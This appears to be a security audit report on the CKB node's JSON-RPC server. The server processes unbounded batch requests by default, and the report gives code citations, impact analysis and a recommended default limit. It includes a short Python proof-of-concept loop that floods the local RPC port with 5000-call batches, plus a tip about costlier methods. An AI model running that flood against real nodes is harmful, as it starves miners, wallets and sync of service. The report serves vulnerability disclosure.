### Title
Unbounded JSON-RPC Batch Request Processing by Default Enables RPC Server Resource Exhaustion — (File: `rpc/src/server.rs`)

### Summary
The CKB HTTP JSON-RPC server ships with `rpc_batch_limit` disabled by default. The batch-size guard in `handle_jsonrpc` is conditional on the limit being configured; when it is absent (the default), an RPC caller can submit a single HTTP POST containing thousands of method calls up to the 10 MiB body cap. The batch is dispatched as a sequential async stream returned as a streaming body, allowing sustained CPU and memory pressure against the node process. The configuration file itself acknowledges the risk but leaves the safeguard commented out.

### Finding Description

In `rpc/src/server.rs`, the `handle_jsonrpc` handler processes JSON-RPC batch requests:

```rust
Request::Batch(calls) => {
    if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
        && calls.len() > *batch_size
    {
        return make_error_response(...);
    }
    let stream = stream::iter(calls)
        .then(move |call| {
            let io = Arc::clone(&io);
            async move { io.handle_call(call, T::default()).await }
        })
        .filter_map(|response| async move { response });
    (
        [(axum::http::header::CONTENT_TYPE, "application/json")],
        StreamBodyAs::json_array(stream),
    ).into_response()
}
``` [1](#0-0) 

The guard at line 275 only fires when `JSONRPC_BATCH_LIMIT` has been initialised, which only happens if `rpc_batch_limit` is set in the config:

```rust
if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
    let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
}
``` [2](#0-1) 

By default `rpc_batch_limit` is `None` — the option is commented out in the shipped configuration:

```toml
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
``` [3](#0-2) 

The HTTP server applies a `TimeoutLayer` of 30 seconds and a `max_request_body_size` of 10 MiB: [4](#0-3) 

Within a single 10 MiB POST body, an attacker can pack roughly 100 000–200 000 minimal JSON-RPC call objects. Each call is dispatched through `io.handle_call`, which may invoke expensive handlers such as `estimate_cycles` (runs CKB-VM scripts up to `max_tx_verify_cycles = 70 000 000` cycles) or `get_block_template` (assembles a full block template). The batch is returned as a **streaming body** (`StreamBodyAs::json_array`); the 30-second `TimeoutLayer` races against the complete response stream, meaning the node's async runtime is saturated for up to 30 seconds per request. Because each HTTP request is handled in an independent `tokio::spawn` task, an attacker can pipeline many such requests concurrently, sustaining CPU and memory pressure indefinitely.

### Impact Explanation

A local RPC caller (the explicitly in-scope attacker profile per `RESEARCHER.md`) can cause sustained CPU saturation and memory growth on the CKB node process. Legitimate RPC consumers (miners calling `get_block_template`, wallets calling `send_transaction`, monitoring tools) are starved of responses. In the worst case, the node's async runtime is so saturated that block relay and sync protocol handlers are delayed, degrading consensus participation. This constitutes a denial-of-service against the node's RPC and potentially its P2P responsiveness.

### Likelihood Explanation

The attack requires only the ability to send HTTP POST requests to `127.0.0.1:8114`, which is the default RPC listen address. Any process running on the same host — including a malicious dependency, a compromised script, or a local user — qualifies. No authentication is required. The default configuration ships with the safeguard disabled and the config comment explicitly warns of the risk, confirming the attack surface is known but unmitigated by default. Constructing the exploit requires only a standard HTTP client and knowledge of any cheap-to-call RPC method name.

### Recommendation

Set a safe default for `rpc_batch_limit` in the shipped `ckb.toml` (e.g., `rpc_batch_limit = 200`) rather than leaving it commented out. Alternatively, initialise `JSONRPC_BATCH_LIMIT` to a conservative default (e.g., 200) in `RpcServer::new` when `config.rpc_batch_limit` is `None`, so the guard at line 275 is always active. Additionally, consider applying per-connection or per-IP request-rate limiting at the HTTP layer to prevent rapid re-submission of large batches within the 30-second window.

### Proof of Concept

```python
import json, requests

# Build a batch of 5000 cheap calls within the 10 MiB body limit
batch = [
    {"jsonrpc": "2.0", "method": "get_tip_block_number", "params": [], "id": i}
    for i in range(5000)
]

# Send repeatedly to sustain pressure
while True:
    requests.post(
        "http://127.0.0.1:8114",
        data=json.dumps(batch),
        headers={"Content-Type": "application/json"},
        timeout=35,
    )
```

With `rpc_batch_limit` unset (the default), each POST is accepted and processed without rejection. Pipelining multiple such requests saturates the Tokio worker threads for the full 30-second timeout window per request. Substituting `estimate_cycles` with a script-heavy transaction amplifies CPU cost per call. Setting `rpc_batch_limit = 200` in `ckb.toml` causes the server to immediately return an error for any batch exceeding 200 entries, confirming the fix.

### Citations

**File:** rpc/src/server.rs (L53-55)
```rust
        if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
            let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
        }
```

**File:** rpc/src/server.rs (L125-128)
```rust
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
```

**File:** rpc/src/server.rs (L274-296)
```rust
            Request::Batch(calls) => {
                if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
                    && calls.len() > *batch_size
                {
                    return make_error_response(jsonrpc_core::Error::invalid_params(format!(
                        "batch size is too large, expect it less than: {}",
                        batch_size
                    )));
                }

                let stream = stream::iter(calls)
                    .then(move |call| {
                        let io = Arc::clone(&io);
                        async move { io.handle_call(call, T::default()).await }
                    })
                    .filter_map(|response| async move { response });

                (
                    [(axum::http::header::CONTENT_TYPE, "application/json")],
                    StreamBodyAs::json_array(stream),
                )
                    .into_response()
            }
```

**File:** resource/ckb.toml (L205-208)
```text
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
```
